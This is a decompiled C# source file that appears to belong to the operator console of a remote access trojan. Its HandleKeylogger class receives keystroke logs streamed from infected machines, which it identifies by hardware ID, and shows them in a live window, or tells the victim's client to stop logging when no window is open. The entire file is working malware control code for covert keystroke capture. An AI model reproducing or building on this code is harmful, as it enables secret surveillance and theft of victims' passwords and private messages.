using System;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000041 RID: 65
	internal class HandleKeylogger
	{
		// Token: 0x060001A7 RID: 423 RVA: 0x0000F0CC File Offset: 0x0000D2CC
		public HandleKeylogger(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				FormKeylogger formKeylogger = (FormKeylogger)Application.OpenForms["keyLogger:" + unpack_msgpack.ForcePathObject("Hwid").GetAsString()];
				if (formKeylogger != null)
				{
					if (formKeylogger.Client == null)
					{
						formKeylogger.Client = client;
						formKeylogger.timer1.Enabled = true;
					}
					formKeylogger.Sb.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
					formKeylogger.richTextBox1.Text = formKeylogger.Sb.ToString();
					formKeylogger.richTextBox1.SelectionStart = formKeylogger.richTextBox1.TextLength;
					formKeylogger.richTextBox1.ScrollToCaret();
				}
				else
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "keyLogger";
					msgPack.ForcePathObject("isON").AsString = "false";
					client.Send(msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}
	}
}
